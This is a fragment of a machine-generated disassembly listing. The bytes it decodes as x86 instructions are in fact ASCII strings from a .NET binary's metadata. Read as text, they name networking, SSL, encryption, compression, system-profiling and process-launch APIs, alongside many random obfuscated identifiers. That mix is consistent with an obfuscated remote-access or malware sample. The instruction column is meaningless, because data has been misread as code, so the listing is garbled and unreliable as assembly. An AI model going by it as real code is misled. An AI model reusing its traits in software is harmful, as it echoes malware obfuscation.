  408f98:	32 2e                	xor    (%esi),%ch
  408f9a:	64 6c                	fs insb (%dx),%es:(%edi)
  408f9c:	6c                   	insb   (%dx),%es:(%edi)
  408f9d:	00 6e 74             	add    %ch,0x74(%esi)
  408fa0:	64 6c                	fs insb (%dx),%es:(%edi)
  408fa2:	6c                   	insb   (%dx),%es:(%edi)
  408fa3:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408fa6:	6c                   	insb   (%dx),%es:(%edi)
  408fa7:	00 4b 69             	add    %cl,0x69(%ebx)
  408faa:	6c                   	insb   (%dx),%es:(%edi)
  408fab:	6c                   	insb   (%dx),%es:(%edi)
  408fac:	00 50 6f             	add    %dl,0x6f(%eax)
  408faf:	6c                   	insb   (%dx),%es:(%edi)
  408fb0:	6c                   	insb   (%dx),%es:(%edi)
  408fb1:	00 47 57             	add    %al,0x57(%edi)
  408fb4:	55                   	push   %ebp
  408fb5:	75 47                	jne    0x408ffe
  408fb7:	5a                   	pop    %edx
  408fb8:	4a                   	dec    %edx
  408fb9:	53                   	push   %ebx
  408fba:	47                   	inc    %edi
  408fbb:	57                   	push   %edi
  408fbc:	43                   	inc    %ebx
  408fbd:	70 6d                	jo     0x40902c
  408fbf:	6c                   	insb   (%dx),%es:(%edi)
  408fc0:	00 4e 6e             	add    %cl,0x6e(%esi)
  408fc3:	78 62                	js     0x409027
  408fc5:	42                   	inc    %edx
  408fc6:	49                   	dec    %ecx
  408fc7:	4d                   	dec    %ebp
  408fc8:	47                   	inc    %edi
  408fc9:	76 6c                	jbe    0x409037
  408fcb:	00 44 78 79          	add    %al,0x79(%eax,%edi,2)
  408fcf:	4e                   	dec    %esi
  408fd0:	41                   	inc    %ecx
  408fd1:	4a                   	dec    %edx
  408fd2:	69 72 4d 6b 77 6c 00 	imul   $0x6c776b,0x4d(%edx),%esi
  408fd9:	43                   	inc    %ebx
  408fda:	43                   	inc    %ebx
  408fdb:	68 4c 76 56 5a       	push   $0x5a56764c
  408fe0:	62 4f 79             	bound  %ecx,0x79(%edi)
  408fe3:	6c                   	insb   (%dx),%es:(%edi)
  408fe4:	00 66 62             	add    %ah,0x62(%esi)
  408fe7:	4f                   	dec    %edi
  408fe8:	77 62                	ja     0x40904c
  408fea:	48                   	dec    %eax
  408feb:	5a                   	pop    %edx
  408fec:	63 45 41             	arpl   %eax,0x41(%ebp)
  408fef:	6d                   	insl   (%dx),%es:(%edi)
  408ff0:	00 62 6e             	add    %ah,0x6e(%edx)
  408ff3:	41                   	inc    %ecx
  408ff4:	44                   	inc    %esp
  408ff5:	61                   	popa
  408ff6:	71 79                	jno    0x409071
  408ff8:	4b                   	dec    %ebx
  408ff9:	56                   	push   %esi
  408ffa:	45                   	inc    %ebp
  408ffb:	6d                   	insl   (%dx),%es:(%edi)
  408ffc:	00 46 44             	add    %al,0x44(%esi)
  408fff:	4c                   	dec    %esp
  409000:	51                   	push   %ecx
  409001:	78 69                	js     0x40906c
  409003:	70 52                	jo     0x409057
  409005:	78 47                	js     0x40904e
  409007:	53                   	push   %ebx
  409008:	78 49                	js     0x409053
  40900a:	6d                   	insl   (%dx),%es:(%edi)
  40900b:	00 48 52             	add    %cl,0x52(%eax)
  40900e:	6f                   	outsl  %ds:(%esi),(%dx)
  40900f:	74 61                	je     0x409072
  409011:	57                   	push   %edi
  409012:	64 72 72             	fs jb  0x409087
  409015:	4c                   	dec    %esp
  409016:	6d                   	insl   (%dx),%es:(%edi)
  409017:	00 6c 7a 49          	add    %ch,0x49(%edx,%edi,2)
  40901b:	51                   	push   %ecx
  40901c:	78 57                	js     0x409075
  40901e:	41                   	inc    %ecx
  40901f:	64 44                	fs inc %esp
  409021:	74 73                	je     0x409096
  409023:	41                   	inc    %ecx
  409024:	4d                   	dec    %ebp
  409025:	50                   	push   %eax
  409026:	6d                   	insl   (%dx),%es:(%edi)
  409027:	00 69 4e             	add    %ch,0x4e(%ecx)
  40902a:	4f                   	dec    %edi
  40902b:	55                   	push   %ebp
  40902c:	46                   	inc    %esi
  40902d:	46                   	inc    %esi
  40902e:	41                   	inc    %ecx
  40902f:	79 74                	jns    0x4090a5
  409031:	53                   	push   %ebx
  409032:	6d                   	insl   (%dx),%es:(%edi)
  409033:	00 79 42             	add    %bh,0x42(%ecx)
  409036:	48                   	dec    %eax
  409037:	7a 77                	jp     0x4090b0
  409039:	68 59 72 79 56       	push   $0x56797259
  40903e:	6d                   	insl   (%dx),%es:(%edi)
  40903f:	00 50 72             	add    %dl,0x72(%eax)
  409042:	4f                   	dec    %edi
  409043:	6c                   	insb   (%dx),%es:(%edi)
  409044:	66 67 75 4a          	data16 addr16 jne 0x409092
  409048:	56                   	push   %esi
  409049:	5a                   	pop    %edx
  40904a:	6d                   	insl   (%dx),%es:(%edi)
  40904b:	00 46 69             	add    %al,0x69(%esi)
  40904e:	6c                   	insb   (%dx),%es:(%edi)
  40904f:	65 53                	gs push %ebx
  409051:	74 72                	je     0x4090c5
  409053:	65 61                	gs popa
  409055:	6d                   	insl   (%dx),%es:(%edi)
  409056:	00 4e 65             	add    %cl,0x65(%esi)
  409059:	74 77                	je     0x4090d2
  40905b:	6f                   	outsl  %ds:(%esi),(%dx)
  40905c:	72 6b                	jb     0x4090c9
  40905e:	53                   	push   %ebx
  40905f:	74 72                	je     0x4090d3
  409061:	65 61                	gs popa
  409063:	6d                   	insl   (%dx),%es:(%edi)
  409064:	00 53 73             	add    %dl,0x73(%ebx)
  409067:	6c                   	insb   (%dx),%es:(%edi)
  409068:	53                   	push   %ebx
  409069:	74 72                	je     0x4090dd
  40906b:	65 61                	gs popa
  40906d:	6d                   	insl   (%dx),%es:(%edi)
  40906e:	00 43 72             	add    %al,0x72(%ebx)
  409071:	79 70                	jns    0x4090e3
  409073:	74 6f                	je     0x4090e4
  409075:	53                   	push   %ebx
  409076:	74 72                	je     0x4090ea
  409078:	65 61                	gs popa
  40907a:	6d                   	insl   (%dx),%es:(%edi)
  40907b:	00 47 5a             	add    %al,0x5a(%edi)
  40907e:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  409085:	6d                   	insl   (%dx),%es:(%edi)
  409086:	00 4d 65             	add    %cl,0x65(%ebp)
  409089:	6d                   	insl   (%dx),%es:(%edi)
  40908a:	6f                   	outsl  %ds:(%esi),(%dx)
  40908b:	72 79                	jb     0x409106
  40908d:	53                   	push   %ebx
  40908e:	74 72                	je     0x409102
  409090:	65 61                	gs popa
  409092:	6d                   	insl   (%dx),%es:(%edi)
  409093:	00 67 65             	add    %ah,0x65(%edi)
  409096:	74 5f                	je     0x4090f7
  409098:	49                   	dec    %ecx
  409099:	74 65                	je     0x409100
  40909b:	6d                   	insl   (%dx),%es:(%edi)
  40909c:	00 67 65             	add    %ah,0x65(%edi)
  40909f:	74 5f                	je     0x409100
  4090a1:	49                   	dec    %ecx
  4090a2:	73 36                	jae    0x4090da
  4090a4:	34 42                	xor    $0x42,%al
  4090a6:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  4090ad:	74 
  4090ae:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  4090b5:	65 6d                	gs insl (%dx),%es:(%edi)
  4090b7:	00 62 4e             	add    %ah,0x4e(%edx)
  4090ba:	42                   	inc    %edx
  4090bb:	49                   	dec    %ecx
  4090bc:	63 54 4d 66          	arpl   %edx,0x66(%ebp,%ecx,2)
  4090c0:	76 6b                	jbe    0x40912d
  4090c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4090c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4090c4:	67 6d                	insl   (%dx),%es:(%di)
  4090c6:	00 72 64             	add    %dh,0x64(%edx)
  4090c9:	52                   	push   %edx
  4090ca:	73 74                	jae    0x409140
  4090cc:	73 65                	jae    0x409133
  4090ce:	62 6a 68             	bound  %ebp,0x68(%edx)
  4090d1:	6d                   	insl   (%dx),%es:(%edi)
  4090d2:	00 53 79             	add    %dl,0x79(%ebx)
  4090d5:	6d                   	insl   (%dx),%es:(%edi)
  4090d6:	6d                   	insl   (%dx),%es:(%edi)
  4090d7:	65 74 72             	gs je  0x40914c
  4090da:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  4090e1:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  4090e8:	79 
  4090e9:	6d                   	insl   (%dx),%es:(%edi)
  4090ea:	6d                   	insl   (%dx),%es:(%edi)
  4090eb:	65 74 72             	gs je  0x409160
  4090ee:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  4090f5:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  4090fc:	73 
  4090fd:	68 41 6c 67 6f       	push   $0x6f676c41
  409102:	72 69                	jb     0x40916d
  409104:	74 68                	je     0x40916e
  409106:	6d                   	insl   (%dx),%es:(%edi)
  409107:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  40910b:	6d                   	insl   (%dx),%es:(%edi)
  40910c:	00 52 61             	add    %dl,0x61(%edx)
  40910f:	6e                   	outsb  %ds:(%esi),(%dx)
  409110:	64 6f                	outsl  %fs:(%esi),(%dx)
  409112:	6d                   	insl   (%dx),%es:(%edi)
  409113:	00 49 43             	add    %cl,0x43(%ecx)
  409116:	72 79                	jb     0x409191
  409118:	70 74                	jo     0x40918e
  40911a:	6f                   	outsl  %ds:(%esi),(%dx)
  40911b:	54                   	push   %esp
  40911c:	72 61                	jb     0x40917f
  40911e:	6e                   	outsb  %ds:(%esi),(%dx)
  40911f:	73 66                	jae    0x409187
  409121:	6f                   	outsl  %ds:(%esi),(%dx)
  409122:	72 6d                	jb     0x409191
  409124:	00 4a 70             	add    %cl,0x70(%edx)
  409127:	67 57                	addr16 push %edi
  409129:	66 49                	dec    %cx
  40912b:	55                   	push   %ebp
  40912c:	68 4c 69 75 6d       	push   $0x6d75694c
  409131:	00 45 6e             	add    %al,0x6e(%ebp)
  409134:	75 6d                	jne    0x4091a3
  409136:	00 52 55             	add    %dl,0x55(%edx)
  409139:	67 43                	addr16 inc %ebx
  40913b:	42                   	inc    %edx
  40913c:	64 71 6c             	fs jno 0x4091ab
  40913f:	64 65 68 64 46 6e 00 	fs gs push $0x6e4664
  409146:	46                   	inc    %esi
  409147:	6e                   	outsb  %ds:(%esi),(%dx)
  409148:	41                   	inc    %ecx
  409149:	53                   	push   %ebx
  40914a:	76 4f                	jbe    0x40919b
  40914c:	61                   	popa
  40914d:	6b 4c 48 51 6e       	imul   $0x6e,0x51(%eax,%ecx,2),%ecx
  409152:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  409156:	6f                   	outsl  %ds:(%esi),(%dx)
  409157:	6f                   	outsl  %ds:(%esi),(%dx)
  409158:	6c                   	insb   (%dx),%es:(%edi)
  409159:	65 61                	gs popa
  40915b:	6e                   	outsb  %ds:(%esi),(%dx)
  40915c:	00 4d 61             	add    %cl,0x61(%ebp)
  40915f:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  409166:	43                   	inc    %ebx
  409167:	68 61 69 6e 00       	push   $0x6e6961
  40916c:	41                   	inc    %ecx
  40916d:	70 70                	jo     0x4091df
  40916f:	44                   	inc    %esp
  409170:	6f                   	outsl  %ds:(%esi),(%dx)
  409171:	6d                   	insl   (%dx),%es:(%edi)
  409172:	61                   	popa
  409173:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  40917a:	43                   	inc    %ebx
  40917b:	75 72                	jne    0x4091ef
  40917d:	72 65                	jb     0x4091e4
  40917f:	6e                   	outsb  %ds:(%esi),(%dx)
  409180:	74 44                	je     0x4091c6
  409182:	6f                   	outsl  %ds:(%esi),(%dx)
  409183:	6d                   	insl   (%dx),%es:(%edi)
  409184:	61                   	popa
  409185:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  40918c:	00 56 42             	add    %dl,0x42(%esi)
  40918f:	66 4b                	dec    %bx
  409191:	4b                   	dec    %ebx
  409192:	77 6f                	ja     0x409203
  409194:	41                   	inc    %ecx
  409195:	73 74                	jae    0x40920b
  409197:	54                   	push   %esp
  409198:	58                   	pop    %eax
  409199:	67 6e                	outsb  %ds:(%si),(%dx)
  40919b:	6e                   	outsb  %ds:(%esi),(%dx)
  40919c:	00 47 65             	add    %al,0x65(%edi)
  40919f:	74 46                	je     0x4091e7
  4091a1:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  4091a8:	57 
  4091a9:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  4091b0:	78 
  4091b1:	74 65                	je     0x409218
  4091b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4091b4:	73 69                	jae    0x40921f
  4091b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4091b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4091b8:	00 67 65             	add    %ah,0x65(%edi)
  4091bb:	74 5f                	je     0x40921c
  4091bd:	4f                   	dec    %edi
  4091be:	53                   	push   %ebx
  4091bf:	56                   	push   %esi
  4091c0:	65 72 73             	gs jb  0x409236
  4091c3:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  4091ca:	74 65                	je     0x409231
  4091cc:	6d                   	insl   (%dx),%es:(%edi)
  4091cd:	2e 49                	cs dec %ecx
  4091cf:	4f                   	dec    %edi
  4091d0:	2e 43                	cs inc %ebx
  4091d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4091d3:	6d                   	insl   (%dx),%es:(%edi)
  4091d4:	70 72                	jo     0x409248
  4091d6:	65 73 73             	gs jae 0x40924c
  4091d9:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  4091e0:	6c                   	insb   (%dx),%es:(%edi)
  4091e1:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4091e8:	00 53 79             	add    %dl,0x79(%ebx)
  4091eb:	73 74                	jae    0x409261
  4091ed:	65 6d                	gs insl (%dx),%es:(%edi)
  4091ef:	2e 53                	cs push %ebx
  4091f1:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4091f5:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  4091fc:	68 
  4091fd:	65 6e                	outsb  %gs:(%esi),(%dx)
  4091ff:	74 69                	je     0x40926a
  409201:	63 61 74             	arpl   %esp,0x74(%ecx)
  409204:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40920b:	74 65                	je     0x409272
  40920d:	6d                   	insl   (%dx),%es:(%edi)
  40920e:	2e 52                	cs push %edx
  409210:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  409213:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409218:	6e                   	outsb  %ds:(%esi),(%dx)
  409219:	00 58 35             	add    %bl,0x35(%eax)
  40921c:	30 39                	xor    %bh,(%ecx)
  40921e:	43                   	inc    %ebx
  40921f:	65 72 74             	gs jb  0x409296
  409222:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  409229:	43                   	inc    %ebx
  40922a:	6f                   	outsl  %ds:(%esi),(%dx)
  40922b:	6c                   	insb   (%dx),%es:(%edi)
  40922c:	6c                   	insb   (%dx),%es:(%edi)
  40922d:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409232:	6e                   	outsb  %ds:(%esi),(%dx)
  409233:	00 4d 61             	add    %cl,0x61(%ebp)
  409236:	6e                   	outsb  %ds:(%esi),(%dx)
  409237:	61                   	popa
  409238:	67 65 6d             	gs insl (%dx),%es:(%di)
  40923b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40923d:	74 4f                	je     0x40928e
  40923f:	62 6a 65             	bound  %ebp,0x65(%edx)
  409242:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  409246:	6c                   	insb   (%dx),%es:(%edi)
  409247:	6c                   	insb   (%dx),%es:(%edi)
  409248:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40924d:	6e                   	outsb  %ds:(%esi),(%dx)
  40924e:	00 73 65             	add    %dh,0x65(%ebx)
  409251:	74 5f                	je     0x4092b2
  409253:	50                   	push   %eax
  409254:	6f                   	outsl  %ds:(%esi),(%dx)
  409255:	73 69                	jae    0x4092c0
  409257:	74 69                	je     0x4092c2
  409259:	6f                   	outsl  %ds:(%esi),(%dx)
  40925a:	6e                   	outsb  %ds:(%esi),(%dx)
  40925b:	00 43 72             	add    %al,0x72(%ebx)
  40925e:	79 70                	jns    0x4092d0
  409260:	74 6f                	je     0x4092d1
  409262:	67 72 61             	addr16 jb 0x4092c6
  409265:	70 68                	jo     0x4092cf
  409267:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  40926e:	74 69                	je     0x4092d9
  409270:	6f                   	outsl  %ds:(%esi),(%dx)
  409271:	6e                   	outsb  %ds:(%esi),(%dx)
  409272:	00 41 72             	add    %al,0x72(%ecx)
  409275:	67 75 6d             	addr16 jne 0x4092e5
  409278:	65 6e                	outsb  %gs:(%esi),(%dx)
  40927a:	74 4e                	je     0x4092ca
  40927c:	75 6c                	jne    0x4092ea
  40927e:	6c                   	insb   (%dx),%es:(%edi)
  40927f:	45                   	inc    %ebp
  409280:	78 63                	js     0x4092e5
  409282:	65 70 74             	gs jo  0x4092f9
  409285:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  40928c:	75 6d                	jne    0x4092fb
  40928e:	65 6e                	outsb  %gs:(%esi),(%dx)
  409290:	74 45                	je     0x4092d7
  409292:	78 63                	js     0x4092f7
  409294:	65 70 74             	gs jo  0x40930b
  409297:	69 6f 6e 00 70 4d 47 	imul   $0x474d7000,0x6e(%edi),%ebp
  40929e:	4b                   	dec    %ebx
  40929f:	69 53 67 7a 62 6f 00 	imul   $0x6f627a,0x67(%ebx),%edx
  4092a6:	49                   	dec    %ecx
  4092a7:	6d                   	insl   (%dx),%es:(%edi)
  4092a8:	61                   	popa
  4092a9:	67 65 43             	addr16 gs inc %ebx
  4092ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4092ad:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  4092b2:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092b4:	00 46 69             	add    %al,0x69(%esi)
  4092b7:	6c                   	insb   (%dx),%es:(%edi)
  4092b8:	65 49                	gs dec %ecx
  4092ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4092bb:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092bd:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  4092c1:	76 65                	jbe    0x409328
  4092c3:	49                   	dec    %ecx
  4092c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4092c5:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092c7:	00 46 69             	add    %al,0x69(%esi)
  4092ca:	6c                   	insb   (%dx),%es:(%edi)
  4092cb:	65 53                	gs push %ebx
  4092cd:	79 73                	jns    0x409342
  4092cf:	74 65                	je     0x409336
  4092d1:	6d                   	insl   (%dx),%es:(%edi)
  4092d2:	49                   	dec    %ecx
  4092d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4092d4:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092d6:	00 43 6f             	add    %al,0x6f(%ebx)
  4092d9:	6d                   	insl   (%dx),%es:(%edi)
  4092da:	70 75                	jo     0x409351
  4092dc:	74 65                	je     0x409343
  4092de:	72 49                	jb     0x409329
  4092e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4092e1:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092e3:	00 43 53             	add    %al,0x53(%ebx)
  4092e6:	68 61 72 70 41       	push   $0x41707261
  4092eb:	72 67                	jb     0x409354
  4092ed:	75 6d                	jne    0x40935c
  4092ef:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092f1:	74 49                	je     0x40933c
  4092f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4092f4:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092f6:	00 50 72             	add    %dl,0x72(%eax)
  4092f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4092fa:	63 65 73             	arpl   %esp,0x73(%ebp)
  4092fd:	73 53                	jae    0x409352
  4092ff:	74 61                	je     0x409362
  409301:	72 74                	jb     0x409377
  409303:	49                   	dec    %ecx
  409304:	6e                   	outsb  %ds:(%esi),(%dx)
  409305:	66 6f                	outsw  %ds:(%esi),(%dx)
  409307:	00 71 65             	add    %dh,0x65(%ecx)
  40930a:	76 7a                	jbe    0x409386
  40930c:	74 5a                	je     0x409368
  40930e:	4c                   	dec    %esp
  40930f:	75 6d                	jne    0x40937e
  409311:	6e                   	outsb  %ds:(%esi),(%dx)
  409312:	51                   	push   %ecx
  409313:	6e                   	outsb  %ds:(%esi),(%dx)
  409314:	6f                   	outsl  %ds:(%esi),(%dx)
  409315:	00 41 65             	add    %al,0x65(%ecx)
  409318:	73 43                	jae    0x40935d
  40931a:	4b                   	dec    %ebx
  40931b:	62 50 48             	bound  %edx,0x48(%eax)
  40931e:	4b                   	dec    %ebx
  40931f:	65 6e                	outsb  %gs:(%esi),(%dx)
  409321:	6f                   	outsl  %ds:(%esi),(%dx)
  409322:	00 67 67             	add    %ah,0x67(%edi)
  409325:	6f                   	outsl  %ds:(%esi),(%dx)
  409326:	64 57                	fs push %edi
  409328:	70 6b                	jo     0x409395
  40932a:	44                   	inc    %esp
  40932b:	6e                   	outsb  %ds:(%esi),(%dx)
  40932c:	6e                   	outsb  %ds:(%esi),(%dx)
  40932d:	6f                   	outsl  %ds:(%esi),(%dx)
  40932e:	6f                   	outsl  %ds:(%esi),(%dx)
  40932f:	00 70 68             	add    %dh,0x68(%eax)
  409332:	71 73                	jno    0x4093a7
  409334:	41                   	inc    %ecx
  409335:	78 6f                	js     0x4093a6
  409337:	68 55 4f 74 58       	push   $0x58744f55
  40933c:	76 6f                	jbe    0x4093ad
  40933e:	00 64 4e 74          	add    %ah,0x74(%esi,%ecx,2)
  409342:	68 71 68 74 45       	push   $0x45746871
  409347:	59                   	pop    %ecx
  409348:	79 49                	jns    0x409393
  40934a:	52                   	push   %edx
  40934b:	79 6f                	jns    0x4093bc
  40934d:	00 46 48             	add    %al,0x48(%esi)
  409350:	73 77                	jae    0x4093c9
  409352:	63 6f 55             	arpl   %ebp,0x55(%edi)
  409355:	59                   	pop    %ecx
  409356:	59                   	pop    %ecx
  409357:	79 6f                	jns    0x4093c8
  409359:	00 64 66 50          	add    %ah,0x50(%esi,%eiz,2)
  40935d:	4b                   	dec    %ebx
  40935e:	73 50                	jae    0x4093b0
  409360:	71 50                	jno    0x4093b2
  409362:	65 6b 46 70 00       	imul   $0x0,%gs:0x70(%esi),%eax
  409367:	76 55                	jbe    0x4093be
  409369:	4c                   	dec    %esp
  40936a:	6e                   	outsb  %ds:(%esi),(%dx)
  40936b:	41                   	inc    %ecx
  40936c:	6b 61 71 47          	imul   $0x47,0x71(%ecx),%esp
  409370:	69 47 70 00 42 53 71 	imul   $0x71534200,0x70(%edi),%eax
  409377:	55                   	push   %ebp
  409378:	49                   	dec    %ecx
  409379:	4b                   	dec    %ebx
  40937a:	57                   	push   %edi
  40937b:	5a                   	pop    %edx
  40937c:	4b                   	dec    %ebx
  40937d:	47                   	inc    %edi
  40937e:	6b 4c 70 00 69       	imul   $0x69,0x0(%eax,%esi,2),%ecx
  409383:	45                   	inc    %ebp
  409384:	61                   	popa
  409385:	48                   	dec    %eax
  409386:	59                   	pop    %ecx
  409387:	44                   	inc    %esp
  409388:	66 47                	inc    %di
  40938a:	57                   	push   %edi
  40938b:	63 4a 4f             	arpl   %ecx,0x4f(%edx)
  40938e:	70 00                	jo     0x409390
  409390:	64 73 6e             	fs jae 0x409401
  409393:	4f                   	dec    %edi
  409394:	77 79                	ja     0x40940f
  409396:	63 70 4d             	arpl   %esi,0x4d(%eax)
  409399:	48                   	dec    %eax
  40939a:	77 64                	ja     0x409400
  40939c:	52                   	push   %edx
  40939d:	70 00                	jo     0x40939f
  40939f:	53                   	push   %ebx
  4093a0:	6c                   	insb   (%dx),%es:(%edi)
  4093a1:	65 65 70 00          	gs gs jo 0x4093a5
  4093a5:	72 77                	jb     0x40941e
  4093a7:	47                   	inc    %edi
  4093a8:	49                   	dec    %ecx
  4093a9:	5a                   	pop    %edx
  4093aa:	77 72                	ja     0x40941e
  4093ac:	44                   	inc    %esp
  4093ad:	50                   	push   %eax
  4093ae:	4c                   	dec    %esp
  4093af:	7a 6b                	jp     0x40941c
  4093b1:	70 00                	jo     0x4093b3
  4093b3:	44                   	inc    %esp
  4093b4:	59                   	pop    %ecx
  4093b5:	5a                   	pop    %edx
  4093b6:	42                   	inc    %edx
  4093b7:	75 68                	jne    0x409421
  4093b9:	70 6a                	jo     0x409425
  4093bb:	46                   	inc    %esi
  4093bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4093bd:	70 00                	jo     0x4093bf
  4093bf:	55                   	push   %ebp
  4093c0:	4d                   	dec    %ebp
  4093c1:	6a 67                	push   $0x67
  4093c3:	43                   	inc    %ebx
  4093c4:	6d                   	insl   (%dx),%es:(%edi)
  4093c5:	70 79                	jo     0x409440
  4093c7:	6e                   	outsb  %ds:(%esi),(%dx)
  4093c8:	70 00                	jo     0x4093ca
  4093ca:	4d                   	dec    %ebp
  4093cb:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4093d2:	74 2e                	je     0x409402
  4093d4:	43                   	inc    %ebx
  4093d5:	53                   	push   %ebx
  4093d6:	68 61 72 70 00       	push   $0x707261
  4093db:	44                   	inc    %esp
  4093dc:	77 61                	ja     0x40943f
  4093de:	57                   	push   %edi
  4093df:	78 76                	js     0x409457
  4093e1:	57                   	push   %edi
  4093e2:	68 76 66 74 61       	push   $0x61746676
  4093e7:	50                   	push   %eax
  4093e8:	69 65 72 70 00 6b 6d 	imul   $0x6d6b0070,0x72(%ebp),%esp
  4093ef:	42                   	inc    %edx
  4093f0:	79 74                	jns    0x409466
  4093f2:	58                   	pop    %eax
  4093f3:	74 4a                	je     0x40943f
  4093f5:	67 74 70             	addr16 je 0x409468
  4093f8:	00 68 4a             	add    %ch,0x4a(%eax)
  4093fb:	77 55                	ja     0x409452
  4093fd:	59                   	pop    %ecx
  4093fe:	4e                   	dec    %esi
  4093ff:	6f                   	outsl  %ds:(%esi),(%dx)
  409400:	6b 42 59 6a          	imul   $0x6a,0x59(%edx),%eax
  409404:	46                   	inc    %esi
  409405:	71 00                	jno    0x409407
  409407:	6f                   	outsl  %ds:(%esi),(%dx)
  409408:	4e                   	dec    %esi
  409409:	73 4e                	jae    0x409459
  40940b:	6c                   	insb   (%dx),%es:(%edi)
  40940c:	41                   	inc    %ecx
  40940d:	71 69                	jno    0x409478
  40940f:	67 6e                	outsb  %ds:(%si),(%dx)
  409411:	65 49                	gs dec %ecx
  409413:	71 00                	jno    0x409415
  409415:	67 46                	addr16 inc %esi
  409417:	73 66                	jae    0x40947f
  409419:	4c                   	dec    %esp
  40941a:	6a 63                	push   $0x63
  40941c:	44                   	inc    %esp
  40941d:	58                   	pop    %eax
  40941e:	57                   	push   %edi
  40941f:	49                   	dec    %ecx
  409420:	6e                   	outsb  %ds:(%esi),(%dx)
  409421:	71 00                	jno    0x409423
  409423:	58                   	pop    %eax
  409424:	5a                   	pop    %edx
  409425:	6e                   	outsb  %ds:(%esi),(%dx)
  409426:	67 6a 6d             	addr16 push $0x6d
  409429:	63 48 44             	arpl   %ecx,0x44(%eax)
  40942c:	53                   	push   %ebx
  40942d:	6e                   	outsb  %ds:(%esi),(%dx)
  40942e:	71 00                	jno    0x409430
  409430:	53                   	push   %ebx
  409431:	79 73                	jns    0x4094a6
  409433:	74 65                	je     0x40949a
  409435:	6d                   	insl   (%dx),%es:(%edi)
  409436:	2e 4c                	cs dec %esp
  409438:	69 6e 71 00 61 47 76 	imul   $0x76476100,0x71(%esi),%ebp
  40943f:	58                   	pop    %eax
  409440:	6d                   	insl   (%dx),%es:(%edi)
  409441:	67 6f                	outsl  %ds:(%si),(%dx)
  409443:	42                   	inc    %edx
  409444:	76 4b                	jbe    0x409491
  409446:	72 00                	jb     0x409448
  409448:	43                   	inc    %ebx
  409449:	71 4a                	jno    0x409495
  40944b:	4f                   	dec    %edi
  40944c:	48                   	dec    %eax
  40944d:	4d                   	dec    %ebp
  40944e:	7a 66                	jp     0x4094b6
  409450:	72 51                	jb     0x4094a3
  409452:	72 00                	jb     0x409454
  409454:	54                   	push   %esp
  409455:	57                   	push   %edi
  409456:	50                   	push   %eax
  409457:	64 74 47             	fs je  0x4094a1
  40945a:	49                   	dec    %ecx
  40945b:	52                   	push   %edx
  40945c:	62 61 72             	bound  %esp,0x72(%ecx)
  40945f:	00 43 6c             	add    %al,0x6c(%ebx)
  409462:	65 61                	gs popa
  409464:	72 00                	jb     0x409466
  409466:	43                   	inc    %ebx
  409467:	68 61 72 00 49       	push   $0x49007261
  40946c:	6e                   	outsb  %ds:(%esi),(%dx)
  40946d:	76 6f                	jbe    0x4094de
  40946f:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  409473:	6d                   	insl   (%dx),%es:(%edi)
  409474:	62 65 72             	bound  %esp,0x72(%ebp)
  409477:	00 4d 44             	add    %cl,0x44(%ebp)
